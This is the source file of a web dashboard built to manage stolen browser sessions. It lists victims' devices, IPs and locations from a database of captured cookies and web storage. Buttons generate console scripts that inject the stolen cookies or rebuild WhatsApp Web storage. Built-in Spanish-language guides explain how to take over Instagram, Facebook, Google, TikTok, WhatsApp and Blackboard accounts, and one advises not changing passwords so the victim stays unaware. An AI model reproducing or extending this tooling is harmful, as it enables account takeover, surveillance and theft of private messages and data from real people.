"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, Palette, Gamepad2, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
  Youtube, Linkedin, ShoppingCart, HelpCircle, ChevronRight, X, Cpu, Trash2, Key
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

interface AccountInfo {
  platform: string;
  identifier: string;
  icon: any;
  color: string;
  health: "active" | "expiring" | "expired";
  domain: string;
  filterMe?: boolean;
}

const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], warning?: string }> = {
  "WhatsApp": {
    title: "WhatsApp Web Mirroring",
    steps: [
      "Abre una pestaña en web.whatsapp.com",
      "Presiona F12 para abrir las herramientas de desarrollador",
      "Copia el script usando el botón verde 'DEEP RESTORE'",
      "Pega el script en la Consola y presiona Enter",
      "La página se recargará y entrará automáticamente"
    ],
    warning: "Solo funciona en navegadores de escritorio. No cierres la sesión en el celular original."
  },
  "Instagram": {
    title: "Instagram Session Hijacking",
    steps: [
      "Instala la extensión 'Cookie-Editor' en Chrome",
      "Usa 'COPY UA' y configura ese User-Agent en tu navegador",
      "Usa 'EXPORT JSON' y pega el contenido en la extensión",
      "Refresca instagram.com",
      "Si pide verificación, usa las cookies de Facebook vinculadas"
    ],
    warning: "El User-Agent debe coincidir exactamente para evitar bloqueos por seguridad."
  },
  "Facebook": {
    title: "Facebook Account Access",
    steps: [
      "Importa las cookies usando el botón 'EXPORT JSON'",
      "Asegúrate de usar el User-Agent del dispositivo original",
      "Entra a facebook.com",
      "No realices cambios de contraseña para no alertar al usuario"
    ]
  },
  "Blackboard": {
    title: "Blackboard Academic Access",
    steps: [
      "Entra a up.edu.pe o blackboard.com",
      "Importa el JSON de cookies proporcionado",
      "Refresca la página; entrarás directo al portal académico",
      "Puedes ver notas, mensajes y material de estudio"
    ]
  },
  "Google": {
    title: "Google / Gmail / Drive",
    steps: [
      "Importa las cookies en google.com",
      "Es crítico usar el 'CONSOLE BOOT' o importar el JSON completo",
      "Si el estado es 'EXPIRING', la sesión podría cerrarse pronto",
      "Accede a mail.google.com o drive.google.com después de importar"
    ],
    warning: "Google es muy sensible al User-Agent y la ubicación (IP)."
  },
  "TikTok": {
    title: "TikTok Profile Mirror",
    steps: [
      "Importa las cookies en tiktok.com",
      "Refresca para entrar al feed del usuario",
      "No intentes cambiar el correo vinculado sin el UA original"
    ]
  }
};

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diffInSeconds = Math.floor((now.getTime() - captured.getTime()) / 1000);
  if (diffInSeconds < 60) return "just now";
  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)}m ago`;
  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)}h ago`;
  return captured.toLocaleDateString();
};

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [loadingCookies, setLoadingCookies] = useState(false);
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);
  const [copiedJson, setCopiedJson] = useState(false);
  const [copiedUA, setCopiedUA] = useState(false);
  const [showGuide, setShowGuide] = useState(false);
  const [webStorage, setWebStorage] = useState<any[]>([]);
  const [copiedStorage, setCopiedStorage] = useState(false);
  const [deviceSearch, setDeviceSearch] = useState("");
  const [deleteProgress, setDeleteProgress] = useState("");

  useEffect(() => {
    fetchSessions();
    const timer = setInterval(() => fetchSessions(), 60000);
    return () => clearInterval(timer);
  }, []);

  const getHealthStatus = (sessionCookies: { name: string, expiration_date: number | null }[]): "active" | "expiring" | "expired" => {
    if (!sessionCookies || sessionCookies.length === 0) return "active";
    const now = Date.now() / 1000;
    const sessionCookie = sessionCookies.find(c => ["c_user", "ds_user_id", "auth_token", "SID", "NetflixId", "li_at", "LOGIN_INFO"].includes(c.name));
    if (!sessionCookie || !sessionCookie.expiration_date) return "active";
    if (sessionCookie.expiration_date < now) return "expired";
    if (sessionCookie.expiration_date < now + 604800) return "expiring";
    return "active";
  };

  const getPrimaryDomainFromCookies = (sessionCookies: { domain: string }[], extraDomains: string[] = []): string => {
    const usageList = extraDomains.length > 0 ? extraDomains : sessionCookies.map(c => c.domain);
    if (usageList.length === 0) return "unknown.com";
    const domainCounts: Record<string, number> = {};
    usageList.forEach(domain => {
      const d = domain.replace(/^\./, "").toLowerCase();
      if (!d.includes("fwmrm.net") && !d.includes("doubleclick") && !d.includes("analytics") && !d.includes("pixel") && !d.includes("googletagmanager")) {
        domainCounts[d] = (domainCounts[d] || 0) + 1;
      }
    });
    const entries = Object.entries(domainCounts);
    if (entries.length === 0) return usageList[0].replace(/^\./, "");
    return entries.sort((a, b) => b[1] - a[1])[0][0];
  };

  const identifyAccount = (sessionCookies: { domain: string, name: string, value: string, expiration_date: number | null }[], fallbackId: string, extraDomains: string[] = []): AccountInfo => {
    const health = getHealthStatus(sessionCookies);
    const allDomains = extraDomains.length > 0 ? extraDomains : sessionCookies.map(c => c.domain);
    const domainStr = allDomains.map(d => d.toLowerCase()).join(" ");
    
    if (domainStr.includes("whatsapp.com") || domainStr.includes("web.whatsapp.com"))
      return { platform: "WhatsApp", identifier: "WhatsApp Web", icon: MessageSquare, color: "text-green-500", health, domain: "web.whatsapp.com" };
    
    const igUser = sessionCookies.find(c => c.name === "ds_user_id" && c.domain.includes("instagram"));
    if (igUser)
      return { platform: "Instagram", identifier: igUser.value || "Account", icon: Instagram, color: "text-pink-500", health, domain: "instagram.com" };
    
    const fbUser = sessionCookies.find(c => c.name === "c_user" && c.domain.includes("facebook"));
    if (fbUser)
      return { platform: "Facebook", identifier: fbUser.value || "Account", icon: Facebook, color: "text-blue-500", health, domain: "facebook.com" };
    
    if (domainStr.includes("up.edu.pe") || domainStr.includes("blackboard.com"))
      return { platform: "Blackboard", identifier: "Academic Portal", icon: GraduationCap, color: "text-blue-400", health, domain: "up.edu.pe" };
    
    if (domainStr.includes("tiktok.com"))
      return { platform: "TikTok", identifier: "TikTok User", icon: Play, color: "text-pink-400", health, domain: "tiktok.com" };
    
    if (domainStr.includes("google.com")) {
      const email = sessionCookies.find(c => c.name.includes("email"))?.value;
      return { platform: "Google", identifier: email || "Google User", icon: Globe, color: "text-red-400", health, domain: "google.com" };
    }

    const primaryDomain = getPrimaryDomainFromCookies(sessionCookies, extraDomains);
    const capitalizedName = primaryDomain.split('.')[0].charAt(0).toUpperCase() + primaryDomain.split('.')[0].slice(1);
    return { platform: capitalizedName || "External", identifier: fallbackId || "Active Session", icon: Shield, color: "text-blue-400", health, domain: primaryDomain };
  };

  const fetchSessions = async () => {
    setLoading(true);
    const { data: sessionData } = await supabase
      .from("session_snapshots")
      .select("id, user_id, snapshot_type, captured_at, user_agent, metadata, device_id, pc_name, os, ip_address, location_city, location_country")
      .order("captured_at", { ascending: false })
      .limit(200); 
    
    if (sessionData) {
      const sessionIds = sessionData.map(s => s.id);
      const { data: allCookies } = await supabase.from("cookies").select("snapshot_id, domain, name, value, expiration_date").in("snapshot_id", sessionIds).limit(10000);
      const { data: allStorage } = await supabase.from("web_storage").select("snapshot_id, domain, storage_type").in("snapshot_id", sessionIds).limit(2000);
      
      const newAccountMap: Record<string, AccountInfo> = {};
      const ALLOWED = ["Instagram", "Facebook", "WhatsApp", "Blackboard", "Google", "TikTok"];
      sessionData.forEach(session => {
        const cookies = (allCookies || []).filter(c => c.snapshot_id === session.id);
        const storage = (allStorage || []).filter(s => s.snapshot_id === session.id);
        const combined = [...cookies.map(c => c.domain), ...storage.map(s => s.domain)];
        const identity = identifyAccount(cookies, session.user_id, combined);
        if (ALLOWED.includes(identity.platform)) newAccountMap[session.id] = identity;
        else newAccountMap[session.id] = { ...identity, filterMe: true };
      });
      const valid = sessionData.filter(s => !newAccountMap[s.id]?.filterMe);
      const validMap: Record<string, AccountInfo> = {};
      valid.forEach(s => validMap[s.id] = newAccountMap[s.id]);
      setAccountMap(validMap); setSessions(valid);
    }
    setLoading(false);
  };

  const deleteAllData = async () => {
    if (!window.confirm("⚠️ ¿ESTÁS SEGURO? Esta acción vaciará por lotes TODA la base de datos de manera irreversible.")) return;
    setLoading(true); setDeleteProgress("PREPARANDO...");
    try {
      const { data: allIds } = await supabase.from("session_snapshots").select("id");
      if (allIds && allIds.length > 0) {
        const ids = allIds.map(i => i.id);
        const batchSize = 100; const total = ids.length;
        for (let i = 0; i < ids.length; i += batchSize) {
          const chunk = ids.slice(i, i + batchSize);
          setDeleteProgress(`LIMPIANDO: ${Math.min(i + batchSize, total)} / ${total}...`);
          await supabase.from("session_snapshots").delete().in("id", chunk);
        }
      }
      setSessions([]); setAccountMap({}); setSelectedSession(null); setDeleteProgress("");
    } catch (err: any) { alert("❌ Error: " + err.message); setDeleteProgress(""); }
    finally { setLoading(false); fetchSessions(); }
  };

  const fetchCookies = async (snapshotId: string) => {
    setLoadingCookies(true);
    const { data } = await supabase.from("cookies").select("*").eq("snapshot_id", snapshotId).limit(3000);
    if (data) setCookies(data);
    setLoadingCookies(false);
  };

  const fetchWebStorage = async (snapshotId: string) => {
    const { data } = await supabase.from("web_storage").select("*").eq("snapshot_id", snapshotId).limit(5000);
    if (data) setWebStorage(data); else setWebStorage([]);
  };

  const generateWhatsAppScript = () => {
    if (webStorage.length === 0) return "";
    const idb = webStorage.filter(e => e.storage_type === 'indexeddb');
    const ls = webStorage.filter(e => e.storage_type === 'localstorage');
    const dbMap: Record<string, any> = {};
    idb.forEach(e => {
      if (!dbMap[e.db_name]) dbMap[e.db_name] = {};
      if (!dbMap[e.db_name][e.store_name]) dbMap[e.db_name][e.store_name] = [];
      dbMap[e.db_name][e.store_name].push({ key: e.key, value: e.value });
    });
    return `(async function() {
      const lsData = ${JSON.stringify(ls.map(e => ({ key: e.key, value: e.value })))};
      lsData.forEach(e => { try { localStorage.setItem(e.key, e.value); } catch(err) {} });
      const dbMap = ${JSON.stringify(dbMap)};
      for (const [dbName, stores] of Object.entries(dbMap)) {
        await new Promise(r => { const d = indexedDB.deleteDatabase(dbName); d.onsuccess = r; d.onerror = r; });
        const db = await new Promise((r, j) => {
          const req = indexedDB.open(dbName, 1);
          req.onupgradeneeded = (e) => Object.keys(stores).forEach(n => !e.target.result.objectStoreNames.contains(n) && e.target.result.createObjectStore(n));
          req.onsuccess = (e) => r(e.target.result); req.onerror = (e) => j(e.target.error);
        });
        for (const [storeName, entries] of Object.entries(stores)) {
          const tx = db.transaction(storeName, 'readwrite'); const s = tx.objectStore(storeName);
          entries.forEach((en:any) => { try { s.put(en.value.startsWith('{') ? JSON.parse(en.value) : en.value, en.key); } catch(e) { s.put(en.value, en.key); } });
        }
        db.close();
      }
      location.reload();
    })()`;
  };

  const handleSessionClick = (session: SessionSnapshot) => {
    setSelectedSession(session); setCopied(false); setCopiedJson(false); setDeviceSearch("");
    fetchCookies(session.id); fetchWebStorage(session.id);
  };

  const copyWhatsAppScript = () => {
    const s = generateWhatsAppScript();
    if (s) navigator.clipboard.writeText(s).then(() => { setCopiedStorage(true); setTimeout(() => setCopiedStorage(false), 5000); });
  };

  const copyToClipboard = () => {
    const filtered = deviceSearch ? cookies.filter(c => c.domain.toLowerCase().includes(deviceSearch.toLowerCase())) : cookies;
    const s = `(function() {
      const cookies = ${JSON.stringify(filtered)};
      document.cookie.split(";").forEach(c => { const n = c.split("=")[0].trim(); document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname; });
      cookies.forEach(c => { try { document.cookie = c.name + "=" + c.value + "; domain=" + (c.domain.startsWith('.') ? c.domain : '.' + c.domain) + "; path=/; SameSite=Lax; Secure"; } catch(e){} });
      setTimeout(() => location.reload(), 1000);
    })()`;
    navigator.clipboard.writeText(s).then(() => { setCopied(true); setTimeout(() => setCopied(false), 5000); });
  };

  const copyCookiesJson = () => {
    if (!selectedSession) return;
    const info = accountMap[selectedSession.id];
    const target = info?.domain.toLowerCase() || "";
    const filtered = cookies.filter(c => {
      const d = c.domain.toLowerCase();
      if (deviceSearch) return d.includes(deviceSearch.toLowerCase());
      if (target.includes("instagram")) return d.includes("instagram.com") || d.includes("facebook.com");
      return d.includes(target);
    });
    const formatted = filtered.map(c => {
      let val = (c.value || "").replace(/^"|"$/g, "").replace(/\\([0-7]{3})/g, (m, o) => String.fromCharCode(parseInt(o, 8)));
      return {
        domain: c.domain.startsWith('.') ? c.domain : (c.name.startsWith("__Host-") ? "" : '.' + c.domain),
        expirationDate: Math.floor(Date.now() / 1000) + 86400 * 90,
        hostOnly: !c.domain.startsWith("."), httpOnly: c.http_only, name: c.name, path: c.path || "/", sameSite: "no_restriction", secure: true, session: false, value: val
      };
    });
    navigator.clipboard.writeText(JSON.stringify(formatted, null, 2)).then(() => { setCopiedJson(true); setTimeout(() => setCopiedJson(false), 5000); });
  };

  const guide = selectedSession ? RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform] : null;

  return (
    <div className="relative min-h-screen">
      <div className="space-y-8 max-w-7xl mx-auto pb-40 px-6">
        <header className="flex flex-col md:flex-row md:items-center justify-between gap-4 py-8">
          <div>
            <h2 className="text-5xl font-black tracking-tighter bg-gradient-to-r from-blue-400 to-emerald-400 bg-clip-text text-transparent">Device Intelligence</h2>
            <p className="text-gray-500 font-bold tracking-wide mt-1 uppercase text-xs">NETWORK NODES: {sessions.length}</p>
          </div>
          <div className="flex items-center gap-4">
            <div className="glass flex items-center px-6 py-3.5 rounded-2xl border border-white/5 w-80 shadow-2xl">
              <Search className="text-gray-500 mr-4" size={20} />
              <input type="text" placeholder="Device, IP, Location..." className="bg-transparent border-none outline-none text-[11px] w-full placeholder:text-gray-600 font-black uppercase tracking-wider text-white" value={searchTerm} onChange={(e) => setSearchTerm(e.target.value)} />
            </div>
            <button onClick={() => fetchSessions()} className="glass p-4 rounded-2xl hover:bg-blue-500/10 border border-white/5 transition-all text-blue-400"><RefreshCw size={22} className={loading?"animate-spin":""} /></button>
            <button onClick={deleteAllData} className="glass flex items-center gap-2 px-6 py-3.5 rounded-2xl border border-red-500/20 font-black text-[10px] tracking-[0.2em] uppercase text-red-500 hover:bg-red-500/10 transition-all shadow-lg shadow-red-500/5">
              <Trash2 size={20} /> {deleteProgress || "PULGAR TODO"}
            </button>
          </div>
        </header>

        {loading ? (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            {[1, 2, 3].map(i => <div key={i} className="h-64 glass rounded-[4rem] animate-pulse shadow-2xl" />)}
          </div>
        ) : (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 text-white">
            {sessions.reduce((acc:any[], s) => {
               const dId = s.device_id || "unknown";
               if (!acc.find(d => d.id === dId)) {
                 const devSess = sessions.filter(x => x.device_id === dId);
                 acc.push({ id: dId, latest: devSess[0], count: devSess.length });
               }
               return acc;
            }, []).map(device => (
              <motion.div key={device.id} whileHover={{ y: -10 }} onClick={() => handleSessionClick(device.latest)} className="glass-intense p-10 rounded-[4rem] border border-white/10 hover:border-blue-500/30 cursor-pointer shadow-3xl bg-black/40">
                <div className="flex justify-between items-start mb-8">
                  <div className="space-y-4">
                    <div className="p-6 rounded-[2.5rem] bg-blue-500/20 w-fit text-blue-400 border border-blue-500/20 shadow-lg"><Monitor size={40} /></div>
                    <div>
                      <h4 className="text-2xl font-black">{device.latest.pc_name || "Unknown PC"}</h4>
                      <p className="text-[10px] font-black text-blue-400/60 uppercase tracking-widest">{device.latest.location_city || "Remote Location"}</p>
                    </div>
                  </div>
                  <div className="text-right">
                    <div className="glass-pill px-4 py-1.5 rounded-full text-[9px] font-black uppercase tracking-widest text-white/30 border border-white/5 mb-2">{device.latest.os}</div>
                    <div className="text-[10px] font-black text-emerald-400 flex items-center gap-2 justify-end tracking-tighter"><div className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"/>ACTIVE</div>
                  </div>
                </div>
                <div className="flex items-center justify-between text-xs font-bold text-gray-500 mt-4 px-2">
                   <div className="flex items-center gap-2 tracking-tight"><Clock size={14}/> {formatRelativeTime(device.latest.captured_at)}</div>
                   <div className="px-5 py-2 rounded-full bg-blue-500/10 text-blue-400 text-[10px] font-black uppercase tracking-widest border border-blue-500/10">{device.count} SNAPS</div>
                </div>
              </motion.div>
            ))}
          </div>
        )}

        <AnimatePresence>
          {selectedSession && (
            <motion.div initial={{ opacity:0 }} animate={{ opacity:1 }} exit={{ opacity:0 }} className="fixed inset-0 z-[110] flex items-center justify-center p-6 bg-black/80 backdrop-blur-sm pointer-events-auto overflow-y-auto">
              <motion.div initial={{ scale:0.9, opacity:0, y:50 }} animate={{ scale:1, opacity:1, y:0 }} className="max-w-7xl w-full relative">
                <button onClick={() => setSelectedSession(null)} className="absolute -top-6 -right-6 p-4 bg-black/80 rounded-full border border-white/10 text-white hover:rotate-90 transition-all z-[120] shadow-2xl"><X size={24}/></button>
                <div className="glass-intense rounded-[4rem] border border-white/10 overflow-hidden bg-black/90 shadow-[0_0_100px_rgba(0,0,0,0.8)]">
                  <div className="grid grid-cols-1 lg:grid-cols-5 h-[85vh]">
                    {/* LEF SIDE: EVIDENCE (2 cols) */}
                    <div className="lg:col-span-2 border-r border-white/5 flex flex-col">
                       <div className="p-10 border-b border-white/5 space-y-6">
                           <div className="flex items-center gap-6">
                             <div className={`p-8 rounded-[2.5rem] bg-black/60 border border-white/10 ${accountMap[selectedSession.id]?.color} shadow-2xl`}>
                               {React.createElement(accountMap[selectedSession.id]?.icon || Shield, { size: 48 })}
                             </div>
                             <div>
                               <h3 className="text-4xl font-black text-white">{accountMap[selectedSession.id]?.platform}</h3>
                               <p className="text-[11px] font-black text-blue-400 uppercase tracking-widest mt-1">{accountMap[selectedSession.id]?.domain}</p>
                             </div>
                           </div>
                           <div className="p-5 bg-white/5 rounded-3xl border border-white/5">
                             <div className="flex justify-between items-center mb-3">
                                <span className="text-[10px] font-black uppercase text-gray-500 tracking-widest">DEVICE IDENTITY</span>
                                <button onClick={() => { navigator.clipboard.writeText(selectedSession.user_agent||""); setCopiedUA(true); setTimeout(()=>setCopiedUA(false), 3000); }} className="text-[10px] font-black text-blue-400 hover:text-blue-300 flex items-center gap-2 uppercase tracking-widest"><Copy size={12}/> {copiedUA ? "COPIED" : "COPY UA"}</button>
                             </div>
                             <p className="text-[10px] font-mono text-white/40 break-all leading-relaxed line-clamp-2">{selectedSession.user_agent}</p>
                           </div>
                       </div>
                       
                       <div className="flex-1 overflow-y-auto p-10 space-y-10 custom-scrollbar">
                          {/* COOKIES */}
                          <div className="space-y-4">
                             <div className="flex items-center justify-between"><h4 className="text-[11px] font-black uppercase tracking-widest text-blue-400 flex items-center gap-2"><Globe size={14}/> Cookie Manifest</h4><span className="text-[10px] font-mono text-gray-600">{cookies.length} INDEXED</span></div>
                             <div className="relative"><Search className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-600" size={14}/><input value={deviceSearch} onChange={(e)=>setDeviceSearch(e.target.value)} placeholder="Filter domains..." className="w-full bg-black/40 border border-white/5 rounded-2xl py-3 pl-10 pr-4 text-[10px] font-bold text-white tracking-wider uppercase focus:border-blue-500/50 outline-none transition-all"/></div>
                             <div className="space-y-2">{cookies.filter(c=>c.domain.toLowerCase().includes(deviceSearch.toLowerCase())).slice(0, 100).map((c, i) => (
                               <div key={i} className="p-4 bg-white/[0.02] border border-white/5 rounded-2xl hover:border-white/10 transition-colors flex justify-between items-center group"><div className="truncate"><p className="text-[9px] font-black text-blue-400/80 uppercase truncate">{c.domain}</p><p className="text-[10px] font-mono text-gray-400 truncate">{c.name}</p></div><div className="text-[10px] font-mono text-gray-700 opacity-0 group-hover:opacity-100 transition-opacity">DATA VALID</div></div>
                             ))}</div>
                          </div>
                       </div>
                    </div>

                    {/* RIGHT SIDE: OPERATIONS & GUIDE (3 cols) */}
                    <div className="lg:col-span-3 flex flex-col p-10 space-y-10 overflow-y-auto custom-scrollbar">
                       <h3 className="text-[11px] font-black uppercase tracking-[0.4em] text-white/20 mb-2">Restoration Operations Hub</h3>
                       
                       <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                          {/* STEP BY STEP MANUAL */}
                          <div className="glass-intense p-8 rounded-[3rem] border border-white/10 bg-white/[0.02] space-y-6">
                             <div className="flex items-center gap-4 text-emerald-400">
                                <div className="p-3 bg-emerald-500/10 rounded-2xl"><List size={24}/></div>
                                <h4 className="text-lg font-black uppercase tracking-widest">Restoration Manual</h4>
                             </div>
                             {guide ? (
                               <div className="space-y-6">
                                  <div className="space-y-3">
                                     {guide.steps.map((step, i) => (
                                       <div key={i} className="flex gap-4 items-start">
                                          <div className="w-6 h-6 rounded-full bg-emerald-500/20 text-emerald-400 flex items-center justify-center text-[10px] font-black flex-shrink-0 border border-emerald-500/20">{i+1}</div>
                                          <p className="text-[11px] text-gray-300 font-bold leading-relaxed">{step}</p>
                                       </div>
                                     ))}
                                  </div>
                                  {guide.warning && (
                                    <div className="p-4 bg-red-500/5 border border-red-500/10 rounded-2xl flex gap-3 text-red-400"><AlertCircle size={16} className="shrink-0"/><p className="text-[9px] font-black uppercase tracking-wider">{guide.warning}</p></div>
                                  )}
                               </div>
                             ) : (
                               <p className="text-xs text-gray-600 font-bold">Selecciona una plataforma válida para ver el manual de recuperación.</p>
                             )}
                          </div>

                          {/* ACTION BUTTONS */}
                          <div className="space-y-4">
                             <button onClick={copyToClipboard} className={`w-full py-10 rounded-[3rem] text-2xl font-black tracking-tighter transition-all active:scale-95 flex flex-col items-center gap-2 shadow-2xl ${copied ? "bg-emerald-600 shadow-emerald-500/30" : "bg-blue-600 hover:bg-blue-500 shadow-blue-500/30 border-t-2 border-white/20"}`}>
                               <div className="flex items-center gap-3"><Cpu size={28}/> {copied ? "SUCCESS" : "CONSOLE BOOT"}</div>
                               <span className="text-[9px] uppercase tracking-[0.3em] opacity-40 italic">Instant Injection Script</span>
                             </button>
                             <div className="grid grid-cols-2 gap-4">
                               <button onClick={copyCookiesJson} className={`p-6 rounded-[2.5rem] glass font-black text-[10px] tracking-widest uppercase transition-all shadow-xl ${copiedJson ? "text-emerald-400 border-emerald-500/40" : "text-white/60 hover:bg-white/10 border-white/5"}`}><FileJson size={20} className="mb-2 mx-auto" />{copiedJson ? "JSON COPIED" : "EXPORT JSON"}</button>
                               {webStorage.length > 0 && <button onClick={copyWhatsAppScript} className={`p-6 rounded-[2.5rem] font-black text-[10px] tracking-widest uppercase transition-all shadow-xl ${copiedStorage ? "bg-emerald-600 text-white" : "bg-emerald-600/20 text-emerald-400 border border-emerald-500/20 animate-pulse"}`}><MessageSquare size={20} className="mb-2 mx-auto" />{copiedStorage ? "READY" : "DEEP RESTORE"}</button>}
                             </div>
                             <div className="p-6 rounded-3xl bg-blue-500/5 border border-blue-500/10 flex gap-4 text-blue-400/60 shadow-inner">
                                <Info size={20} className="shrink-0"/>
                                <p className="text-[9px] font-black uppercase tracking-widest leading-relaxed">System mirror status: 1:1. High-precision restoration ready. Use browser profile isolation for maximum safety.</p>
                             </div>
                          </div>
                       </div>

                       {/* BOTOM STATS */}
                       <div className="grid grid-cols-3 gap-6 pt-10 border-t border-white/5">
                          <div className="text-center p-6 bg-white/[0.02] rounded-[2rem] border border-white/5"><p className="text-[9px] font-black text-gray-600 uppercase tracking-widest mb-1">DATA NODES</p><p className="text-2xl font-black text-white">{cookies.length + webStorage.length}</p></div>
                          <div className="text-center p-6 bg-white/[0.02] rounded-[2rem] border border-white/5"><p className="text-[9px] font-black text-gray-600 uppercase tracking-widest mb-1">HEALTH STATUS</p><p className={`text-2xl font-black ${accountMap[selectedSession.id]?.health === 'active' ? 'text-emerald-400' : 'text-amber-400'}`}>{accountMap[selectedSession.id]?.health.toUpperCase()}</p></div>
                          <div className={`text-center p-6 rounded-[2rem] border border-white/5 ${accountMap[selectedSession.id]?.color} bg-white/[0.02]`}><p className="text-[9px] font-black opacity-40 uppercase tracking-widest mb-1">SOURCE</p><p className="text-2xl font-black">{selectedSession.snapshot_type.replace('_', ' ').toUpperCase()}</p></div>
                       </div>
                    </div>
                  </div>
                </div>
              </motion.div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
